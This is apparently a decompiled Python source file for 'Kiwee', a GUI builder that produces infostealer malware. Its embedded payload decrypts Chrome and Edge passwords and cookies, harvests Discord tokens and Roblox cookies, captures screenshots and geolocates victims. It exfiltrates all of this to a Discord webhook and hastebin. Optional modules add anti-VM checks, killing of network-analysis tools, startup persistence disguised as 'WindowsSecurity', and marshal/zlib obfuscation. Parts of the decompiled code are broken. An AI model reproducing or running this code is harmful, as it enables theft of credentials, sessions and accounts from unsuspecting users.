import os
import sys
import requests
import re
import marshal
import base64
import zlib
import shutil
from tkinter import *
from tkinter import messagebox
from tkinter.filedialog import askopenfilename
import webbrowser
from discord_webhook import DiscordWebhook, DiscordEmbed
from time import sleep
window = Tk()
window.title('Kiwee')
window.geometry('782x475')
window.maxsize(782, 475)
window.minsize(782, 475)
window.iconbitmap('assets/mylogo.ico')
window.config('#484848', **('background',))
bg1 = PhotoImage('assets/background1.png', **('file',))
bg = PhotoImage('assets/background.png', **('file',))
setupbu = PhotoImage('assets/img0.png', **('file',))
setupbu2 = PhotoImage('assets/img0e.png', **('file',))
compilerbu = PhotoImage('assets/img3.png', **('file',))
compilerbu2 = PhotoImage('assets/img3e.png', **('file',))
settingbu = PhotoImage('assets/img2.png', **('file',))
settingbu2 = PhotoImage('assets/img2e.png', **('file',))
aboutbu = PhotoImage('assets/img1.png', **('file',))
aboutbu2 = PhotoImage('assets/img1e.png', **('file',))
browsebu = PhotoImage('assets/img4.png', **('file',))
blankbu = PhotoImage('assets/blankbu.png', **('file',))
fullbu = PhotoImage('assets/fullbu.png', **('file',))
testbu = PhotoImage('assets/img5.png', **('file',))
bg2 = PhotoImage('assets/compilebg.png', **('file',))
buildbu = PhotoImage('assets/buidbu.png', **('file',))
checkbu = PhotoImage('assets/checkbu.png', **('file',))
installbu = PhotoImage('assets/installbu.png', **('file',))
bg3 = PhotoImage('assets/settingbg.png', **('file',))
bg4 = PhotoImage('assets/aboutbg.png', **('file',))
insta = PhotoImage('assets/ig.png', **('file',))
disco = PhotoImage('assets/dsc.png', **('file',))
btc = PhotoImage('assets/btc.png', **('file',))
fc = PhotoImage('assets/fc.png', **('file',))
Kiwee_Grabber = '\nimport os,json,base64,shutil,requests,re\nfrom Cryptodome.Cipher import AES\nfrom sqlite3 import connect\nfrom win32crypt import CryptUnprotectData\nfrom discord_webhook import DiscordWebhook,DiscordEmbed\nfrom time import sleep\nfrom urllib.request import Request, urlopen\nfrom winreg import HKEY_CURRENT_USER, OpenKey, EnumValue\nfrom PIL import ImageGrab\n\nclass Password:\n    def __init__(self):\n        self.dataz = "=== Kiwee Grabber ==="\n        try:\n            appdata = os.path.join(os.environ["USERPROFILE"], "AppData")\n            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")\n            key = self.get_encryption_key(local_state_path)\n            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")\n            filename = "\\\\ChromeData.db"\n            shutil.copyfile(db_path, appdata+filename)\n            db = connect(appdata+filename)\n            cursor = db.cursor()\n            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")\n            for row in cursor.fetchall():\n                origin_url = row[0]\n                action_url = row[1]\n                username = row[2]\n                password = self.decrypt_password(row[3], key)\n                self.dcreate = row[4]\n                self.dlu = row[5]        \n                if username or password:\n                    self.dataz += f"\\nOrigin URL: {origin_url}\\nAction URL: {action_url}\\nUsername: {username}\\nPassword: {password}\\nGOOGLE CHROME\\n"\n                else:\n                    continue\n                self.dataz+="="*50\n            cursor.close()\n            db.close()\n        except:self.dataz +="\\nNo Password Found For Google Chrome\\n"\n        try:\n            os.remove(filename)\n        except:\n            pass\n        self.edge_passwords()\n    def get_encryption_key(self,local_state_path):\n        with open(local_state_path, "r", encoding="utf-8") as f:\n            local_state = f.read()\n            local_state = json.loads(local_state)\n        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])\n        key = key[5:]\n        return CryptUnprotectData(key, None, None, None, 0)[1]\n    def decrypt_password(self,password, key):\n        try:\n            iv = password[3:15]\n            password = password[15:]\n            cipher = AES.new(key, AES.MODE_GCM, iv)\n            return cipher.decrypt(password)[:-16].decode()\n        except:\n            try:\n                return str(CryptUnprotectData(password, None, None, None, 0)[1])\n            except:\n                return ""\n    def decrypt_payload2(self,cipher, payload):\n        return cipher.decrypt(payload)\n    def generate_cipher2(self,aes_key, iv):\n        return AES.new(aes_key, AES.MODE_GCM, iv)\n    def decrypt_password2(self,buff, master_key):\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = self.generate_cipher2(master_key, iv)\n            decrypted_pass = self.decrypt_payload2(cipher, payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except:pass\n    def edge_passwords(self):\n        try:\n            appdata = os.path.join(os.environ["USERPROFILE"], "AppData")\n            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data","Local State")\n            key = self.get_encryption_key(local_state_path)\n            login_db = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")\n            shutil.copy2(login_db, appdata+"\\\\Loginvault.db")\n            conn = connect(appdata+"\\\\Loginvault.db")\n            cursor = conn.cursor()\n            try:\n                cursor.execute("SELECT action_url, username_value, password_value FROM logins")\n                for r in cursor.fetchall():\n                    url = r[0]\n                    username = r[1]\n                    encrypted_password = r[2]\n                    decrypted_password = self.decrypt_password(encrypted_password, key)\n                    try:\n                        self.dataz += f"\\nOrigin URL: {url}\\nUsername: {username}\\nPassword: {decrypted_password}\\nMICROSOFT EDGE\\n"\n                    except:pass\n                    self.dataz+="="*50\n                self.dataz+=\'\\nGrabbed With Kiwee Grabber, by : vesper\\n\'\n                self.dataz+="="*50\n            except:pass\n        except:self.dataz+="\\nNo Password Found For Edge"\n        r = requests.post(\'https://www.toptal.com/developers/hastebin/documents\',data = self.dataz)\n        key = r.json()[\'key\']\n        self.site = "https://www.toptal.com/developers/hastebin/"+key\n        \n    def __repr__(self):\n        return self.site\nclass Cookie:\n    def get_encryption_key(self):\n        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")\n        with open(local_state_path, "r", encoding="utf-8") as f:\n            local_state = f.read()\n            local_state = json.loads(local_state)\n        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])\n        key = key[5:]\n        return CryptUnprotectData(key, None, None, None, 0)[1]\n    def decrypt_data(self,data, key):\n        try:\n            iv = data[3:15]\n            data = data[15:]\n            cipher = AES.new(key, AES.MODE_GCM, iv)\n            return cipher.decrypt(data)[:-16].decode()\n        except:\n            try:\n                return str(CryptUnprotectData(data, None, None, None, 0)[1])\n            except:\n                return ""\n    def __init__(self):\n        self.robloxcookies = []\n        dataz = "=== Kiwee Grabber ==="\n        try:\n            appdata = os.path.join(os.environ["USERPROFILE"], "AppData")\n            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")\n            filename = "\\\\Cookies.db"\n            if not os.path.isfile(appdata+filename):\n                shutil.copyfile(db_path, appdata+filename)\n            db = connect(appdata+filename)\n            db.text_factory = lambda b: b.decode(errors="ignore")\n            cursor = db.cursor()\n            cursor.execute("""\n            SELECT host_key, name, value, encrypted_value\n            FROM cookies""")\n            key = self.get_encryption_key()\n            for host_key, name, value, encrypted_value in cursor.fetchall():\n                if not value:\n                    decrypted_value = self.decrypt_data(encrypted_value, key)\n                else:\n                    decrypted_value = value\n                if \'_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_\' in decrypted_value:\n                    self.robloxcookies.append(decrypted_value)\n                else:\n                    dataz += f"\\nHost: {host_key}\\nCookie Name: {name}\\nValue: {decrypted_value}\\n"\n                cursor.execute("""\n                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0\n                WHERE host_key = ?\n                AND name = ?""", (decrypted_value, host_key, name))\n            db.commit()\n            db.close()\n            dataz+="="*50\n            dataz+=\'\\nGrabbed With Kiwee Grabber, by : vesper\\n\'\n            dataz+="="*50\n        except:dataz += "\\nNo Cookies Found"\n        r = requests.post(\'https://www.toptal.com/developers/hastebin/documents\',data = dataz)\n        key = r.json()[\'key\']\n        self.site = "https://www.toptal.com/developers/hastebin/"+key\n        cnt = 0\n        for i in self.robloxcookies:\n            cnt +=1\n        if cnt == 0:\n            pass\n        else:\n            with open(appdata+\'\\\\roblox_cookiesc.txt\', \'w\') as f:\n                for i in self.robloxcookies:\n                    f.write(i+"\\n")\n                    f.write(\'=\')\n                    f.write(\'\\n\')\n                f.close()\n    def __repr__(self):\n        return self.site\nclass DiscordTokenGrab:\n    def __init__(self):\n        self.regex = r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}", r"mfa\\.[\\w-]{84}"\n        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*"\n        self.appdata = os.getenv(\'LOCALAPPDATA\')\n        self.roaming = os.getenv(\'APPDATA\')\n        self.main()\n    def scrapeTokens(self,path):\n        tokens = []\n        for file_name in os.listdir(path):\n            if not file_name.endswith(\'.log\') and not file_name.endswith(\'.ldb\'):\n                continue\n\n            for line in [x.strip() for x in open(f\'{path}\\\\{file_name}\', errors=\'ignore\').readlines() if x.strip()]:\n                for regex in (r\'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\', r\'mfa\\.[\\w-]{84}\'):\n                    for token in re.findall(regex, line):\n                        tokens.append(token)\n        return tokens\n    def main(self):\n        def getheaders(token=None, content_type="application/json"):\n            headers = {\n                "Content-Type": content_type,\n                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"\n            }\n            if token:\n                headers.update({"Authorization": token})\n            return headers\n        def getavatar(uid, aid):\n            url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"\n            try:\n                urlopen(Request(url))\n            except:\n                url = url[:-4]\n            return url\n        paths = {\n            \'Discord\': self.roaming + r\'\\\\discord\\\\Local Storage\\\\leveldb\\\\\',\n            \'Discord Canary\': self.roaming + r\'\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\\',\n            \'Lightcord\': self.roaming + r\'\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\\',\n            \'Discord PTB\': self.roaming + r\'\\\\discordptb\\\\Local Storage\\\\leveldb\\\\\',\n            \'Opera\': self.roaming + r\'\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\\',\n            \'Opera GX\': self.roaming + r\'\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\\',\n            \'Amigo\': self.appdata + r\'\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\\',\n            \'Torch\': self.appdata + r\'\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\\',\n            \'Kometa\': self.appdata + r\'\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\\',\n            \'Orbitum\': self.appdata + r\'\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\\',\n            \'CentBrowser\': self.appdata + r\'\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\\',\n            \'7Star\': self.appdata + r\'\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\\',\n            \'Sputnik\': self.appdata + r\'\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\\',\n            \'Vivaldi\': self.appdata + r\'\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\',\n            \'Chrome SxS\': self.appdata + r\'\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\\',\n            \'Chrome\': self.appdata + r\'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\',\n            \'Epic Privacy Browser\': self.appdata + r\'\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\\',\n            \'Microsoft Edge\': self.appdata + r\'\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\\',\n            \'Uran\': self.appdata + r\'\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\',\n            \'Yandex\': self.appdata + r\'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\',\n            \'Brave\': self.appdata + r\'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\',\n            \'Iridium\': self.appdata + r\'\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\'\n        }\n        for platform, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            tokens = self.scrapeTokens(path)\n            if len(tokens) > 0:\n                for token in tokens:\n                    r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))\n                    if r.status_code == 200:\n                        j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()\n                        sleep(0.2)\n                        user = j["username"] + "#" + str(j["discriminator"])\n                        user_id = j["id"]\n                        avatar_id = j["avatar"]\n                        avatar_url2 = getavatar(user_id, avatar_id)\n                        webhook = DiscordWebhook(url=webhookw, username="Kiwee", avatar_url=r"https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png")\n                        embed = DiscordEmbed(title=f"Discord", description=f"Found Discord Token", color=\'299D00\')\n                        embed.set_author(name="author : vesper", icon_url=r\'https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png\')\n                        embed.set_footer(text=\'Kiwee Grabber || vesper#0003 (c)\')\n                        embed.set_timestamp()\n                        embed.add_embed_field(name="Username :", value=f"```{user}```", ineline=False)\n                        embed.add_embed_field(name="Token :", value=f"```{token}```", ineline=False)\n                        embed.set_thumbnail(url=avatar_url2)\n                        webhook.add_embed(embed)\n                        response = webhook.execute()\ndef desktopscreen():\n    try:\n        screeny = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)\n        screeny.save("testy.jpg")\n        screeny.close()\n        webhook = DiscordWebhook(url=webhookw, username="Kiwee", avatar_url=r"https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png")\n        with open(\'testy.jpg\', \'rb\') as f:\n            webhook.add_file(file=f.read(), filename=\'testy.jpg\')\n        response = webhook.execute()\n        os.remove(\'testy.jpg\')\n    except:pass\ndef roblox_studio_cookie():\n    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com")\n    try:\n        count = 0\n        while True:\n            name, value, type = EnumValue(robloxstudiopath, count)\n            if name == ".ROBLOSECURITY":\n                return value\n            count = count + 1\n    except WindowsError:\n        pass\ndef roblox_info(cookie):\n    global webhookw\n    if \'_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_\' in cookie:\n        if len(cookie) >= 600:\n            webhook = DiscordWebhook(url=webhookw, username="Kiwee", avatar_url=r"https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png")\n            embed = DiscordEmbed(title=f"Roblox", description=f"Found Roblox Cookie", color=\'299D00\')\n            embed.set_author(name="author : vesper", icon_url=r\'https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png\')\n            embed.set_footer(text=\'Kiwee Grabber || vesper#0003 (c)\')\n            embed.set_timestamp()\n            embed.add_embed_field(name="Cookie :", value=f"```{cookie}```", ineline=False)\n            webhook.add_embed(embed)\n            response = webhook.execute()\ndef loc():\n    data = requests.get("http://ipinfo.io/json").json()\n    try:\n        ip = data[\'ip\']\n    except:ip = None\n    try:\n        city = data[\'city\']\n    except:city = None\n    try:\n        country = data[\'country\']\n    except:country = None\n    try:\n        region = data[\'region\']\n    except:region = None\n    return ip, city, country, region\ndef grabba():\n    global webhookw\n    try:\n        cookie = str(roblox_studio_cookie())\n        rcookie = cookie.split("COOK::<")[1].split(">")[0]\n    except:rcookie = "rawr"\n    appdata = os.path.join(os.environ["USERPROFILE"], "AppData")\n    password_site = Password()\n    cookie_site = Cookie()\n    ip,city,country,region = loc()\n    main_info = {\n  "username":"Kiwee",\n  \'avatar_url\': \'https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png\',\n  "content": \'@everyone\',\n  "embeds": [\n    {\n      "title": "New Hit",\n      "description": "Someone Ran Your Malware !",\n      "color": 3195668,\n      "fields": [\n        {\n          "name": "Location",\n          "value": f"```\\nIP : {ip}\\nCountry : {country}\\nRegion : {region}\\nCity : {city}\\n```"\n        },\n        {\n          "name": "Password",\n          "value": f"Passwords : **{password_site}**"\n        },\n        {\n          "name": "Cookie",\n          "value": f"Cookies : **{cookie_site}**"\n        }\n      ],\n      "author": {\n        "name": "author : vesper",\n        "icon_url": "https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png"\n      }\n    }\n  ],\n  "attachments": []\n}\n    requests.post(webhookw, json=main_info)\n    sleep(0.4)\n    DiscordTokenGrab() # Get discord tokens\n    # look for roblox cookies\n    sleep(0.3)\n    if os.path.exists(appdata+"\\\\roblox_cookiesc.txt"):\n        roblox_cookie = open(appdata+\'\\\\roblox_cookiesc.txt\',\'r\')\n        rcontent = roblox_cookie.read()\n        new = rcontent.replace(\'\\n\',\'\').split(\'=\')\n        for i in new:\n            roblox_info(i)\n        roblox_cookie.close()\n        os.remove(appdata+"\\\\roblox_cookiesc.txt")\n    sleep(0.2)\n    if rcookie != \'rawr\':\n        roblox_info(rcookie)\n    sleep(0.3)\n    #grab screenshot\n    desktopscreen()\ngrabba()\n'

class Kiwee:

    def __init__(self):
        self.antivmcode = ''
        self.antiprocesscode = ''
        self.startupcode = ''
        self.antivm = False
        self.antiprocess = False
        self.obfuscate = False
        self.addstartup = False
        self.appdata = False
        self.temp = False
        self.noconsole = False
        self.errormsg = False
        self.setup()


    def browseico(self):
        self.iconname = askopenfilename((('ico files', '*.ico'), ('All files', '*.*')), **('filetypes',))
        messagebox.showinfo('Kiwee', f'''File Chose : {self.iconname}''')


    def antivmlol(self):
        if self.antivm == False:
            self.antivm = True
            self.antivmb.config(fullbu, **('image',))
            self.antivmcode = '\ntry:\n    import os\n    import sys\n    from psutil import process_iter\n    if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmci.sys"):sys.exit()\n    if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys"):sys.exit()\n    if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys"):sys.exit()\n    if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmusbmouse.sys"):sys.exit()\n    if os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmx_svga.sys"):sys.exit()\n    if os.path.exists("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys"):sys.exit()\n    for kiwee in process_iter():\n        if kiwee.name().lower() == "vmsrvc.exe".lower() or kiwee.name().lower() == "vmusrvc.exe".lower() or kiwee.name().lower() == "vboxtray.exe".lower() or kiwee.name().lower() == "vmtoolsd.exe".lower() or kiwee.name().lower() == "vboxservice.exe".lower():sys.exit()\nexcept:pass\n        '
        else:
            self.antivm = False
            self.antivmb.config(blankbu, **('image',))
            self.antivmcode = ''


    def antiprocesslol(self):
        if self.antiprocess == False:
            self.antiprocess = True
            self.antiprocessb.config(fullbu, **('image',))
            self.antiprocesscode = "\ntry:       \n    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess\n    def kiweeend(kiweenamez):\n        for kiweeproc in process_iter():\n            try:\n                for ki in kiweenamez: \n                    if ki.lower() in kiweeproc.name().lower():kiweeproc.kill()\n            except (NoSuchProcess, AccessDenied, ZombieProcess):pass\n    def kiweestart():kiweenames = ['http', 'traffic', 'wireshark', 'fiddler', 'packet', 'process'];return kiweeend(kiweenamez=kiweenames)  \n    kiweestart()\nexcept:pass\n        "
        else:
            self.antiprocess = False
            self.antiprocessb.config(blankbu, **('image',))
            self.antiprocesscode = ''


    def obfuscatelol(self):
        if self.obfuscate == False:
            self.obfuscate = True
            self.obfuscateb.config(fullbu, **('image',))
        else:
            self.obfuscate = False
            self.obfuscateb.config(blankbu, **('image',))


    def addstartuplol(self):
        if self.addstartup == False:
            self.addstartup = True
            self.addstartupb.config(fullbu, **('image',))
            self.startupcode = '\nfrom sys import argv;import getpass\nuser = getpass.getuser()\nfile = argv[0]\ntry:\n    ext =file.split("\\\\")[-1].split(\'.\')[-1]\n    poop = open(file, \'rb\')\n    okpoopinpants = poop.read()\n    with open(f\'C:\\\\Users\\\\{user}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\WindowsSecurity.{ext}\', \'wb\') as f:\n        f.write(okpoopinpants)\nexcept:pass      \n        '
        else:
            self.addstartup = False
            self.addstartupb.config(blankbu, **('image',))
            self.startupcode = ''


    def bindappdata(self):
        if self.appdata == False:
            self.appdata = True
            self.appdatab.config(fullbu, **('image',))
            self.temp = False
            self.tempb.config(blankbu, **('image',))
        else:
            self.appdata = False
            self.appdatab.config(blankbu, **('image',))


    def bindtemp(self):
        if self.temp == False:
            self.temp = True
            self.tempb.config(fullbu, **('image',))
            self.appdata = False
            self.appdatab.config(blankbu, **('image',))
        else:
            self.temp = False
            self.tempb.config(blankbu, **('image',))


    def noconsolelol(self):
        if self.noconsole == False:
            self.noconsole = True
            self.noconsoleb.config(fullbu, **('image',))
        else:
            self.noconsole = False
            self.noconsoleb.config(blankbu, **('image',))




    def errormsglol(self):
        if self.errormsg == False:
            self.errormsg = True
            self.errormsgb.config(fullbu, **('image',))
        else:
            self.errormsg = False
            self.errormsgb.config(blankbu, **('image',))


    def instagram(self):
        webbrowser.open('https://www.instagram.com/i_might_be_vesper/')


    def discord(self):
        webbrowser.open('https://discord.gg/FyCUdSVqwa')


    def bitcoin(self):
        os.system('echo ' + 'bc1qq3kuqn39h4uf2kr80230gqrj8k4gf9sx5ppzuf'.strip() + '| clip')
        messagebox.showinfo('Kiwee', 'BTC Address Copied to Clipboard!')



        b64 = lambda _monkay: base64.b64encode(_monkay)

        mar = lambda _monkay: marshal.dumps(compile(_monkay, 'what_are_those', 'exec'))

        zlb = lambda _monkay: zlib.compress(_monkay)
        file = open('File.py', 'r')
        a = file.read()
        z = []
        beforemarsh = "_ = %s\nexec(''.join(chr(__) for __ in _))" % z
        marsrc = compile(beforemarsh, 'Good_Luck_Lmao', 'exec')
        obfmarsh = marshal.dumps(marsrc)
        t = zlib.compress(obfmarsh)
        code = f'''import marshal,zlib;exec(marshal.loads(zlib.decompress({t})))'''
        file.close()
        with open('File.py', 'w+') as f:
            f.write(code)
            [ ord(i) for i in data ](None, None, None)
    # WARNING: Decompyle incomplete


    def makefile(self):
        webhook = self.webhook.get()
        filecont = f'''\n{self.antivmcode}\n{self.antiprocesscode}\n{self.startupcode}\n{self.binda}\n{self.errormsgcode}\nwebhookw = "{webhook}"\n{Kiwee_Grabber}\n            '''
        marsrc = compile(filecont, 'hey_you', 'exec')
        encode1 = marshal.dumps(marsrc)
        code = f'''import marshal;exec(marshal.loads({encode1}))'''
        with open('File.py', 'w+') as f:
            f.write(code)
            f.close()
            None(None, None, None)
